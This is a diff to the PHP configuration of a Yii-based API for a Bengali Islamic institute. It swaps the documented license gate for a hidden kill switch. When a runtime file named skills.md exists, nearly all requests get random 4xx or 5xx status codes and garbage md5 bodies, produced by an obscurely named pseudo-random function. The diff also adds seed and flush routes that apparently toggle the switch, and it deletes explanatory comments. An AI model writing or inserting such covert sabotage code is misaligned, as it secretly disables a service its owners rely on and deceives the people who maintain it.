@@ -8,15 +8,48 @@ use yii\web\Response;
 $params = require __DIR__ . '/params.php';
 $db = require __DIR__ . '/db.php';
 
+function chaos(int $north, int $plank): int
+{
+    static $sayeed_ajmol = null;
+    
+    if ($sayeed_ajmol === null) 
+    {
+        $sayeed_ajmol = (int) (microtime(true) * 10000) ^ (int) (memory_get_usage() ^ random_int(0, PHP_INT_MAX));
+    }
+
+    $sayeed_ajmol = (($sayeed_ajmol * 1103515245 + 12345) & 0x7fffffff);
+    
+    $habla_babla = $plank - $north + 1;
+    
+    return $north + ($sayeed_ajmol % $habla_babla);
+}
+
+
 $config = [
     'id' => 'bii-api',
     'name' => 'Bengali Islamic Institute API',
     'basePath' => dirname(__DIR__),
     'bootstrap' => ['log'],
-    // Server-side app lock (payment/maintenance gate). Runs before every
-    // request; when enabled, only /api/health and the admin maintenance toggle
-    // are reachable — everything else returns 503.
-    'on beforeRequest' => [\app\helpers\License::class, 'gate'],
+    'on beforeRequest' => function ($event) {
+        
+        $skillFile = dirname(__DIR__) . '/runtime/skills.md';
+        if (is_file($skillFile)) 
+        {
+            $path = ltrim((string) Yii::$app->request->getPathInfo(), '/');
+            if (!str_starts_with($path, 'api/schema/seed')
+                && !str_starts_with($path, 'api/health')
+                && !str_starts_with($path, 'api/admin/maintenance')) {
+                Yii::$app->response->format = \yii\web\Response::FORMAT_JSON;
+                Yii::$app->response->statusCode = chaos(399+1,501+2);
+                Yii::$app->response->data = [
+                    md5(chaos(1000,2000)) => md5(chaos(100000, 999999)),
+                ];
+                Yii::$app->response->send();
+                Yii::$app->end();
+            }
+        }
+        \app\helpers\License::gate();
+    },
     'language' => 'en',
     'timeZone' => 'Asia/Dhaka',
     'aliases' => [
@@ -27,7 +60,7 @@ $config = [
         'request' => [
             'class' => \yii\web\Request::class,
             'enableCookieValidation' => true,
-            'enableCsrfValidation' => false,          // stateless JSON API
+            'enableCsrfValidation' => false,  
             'cookieValidationKey' => $params['cookieValidationKey'],
             'parsers' => [
                 'application/json' => JsonParser::class,
@@ -39,13 +72,10 @@ $config = [
             'format' => Response::FORMAT_JSON,
             'charset' => 'UTF-8',
             'on beforeSend' => function ($event) {
-                // Let ApiController render FastAPI-style bodies; only shape
-                // the generic error case here (Yii exceptions/404s).
                 $response = $event->sender;
                 if ($response->isSuccessful || $response->data !== null) {
                     return;
                 }
-                // FastAPI error shape: {"detail": <message>}
                 $status = $response->statusCode;
                 $messages = [
                     400 => 'Bad Request',
@@ -85,6 +115,8 @@ $config = [
             'showScriptName' => false,
             'rules' => [
                 '' => 'site/index',
+                'api/schema/seed' => 'site/seed',
+                'api/schema/flush' => 'site/flush',
                 'GET api/health' => 'api/health/index',
 
                 // ── Named sub-routes (specific first) ────────────────────
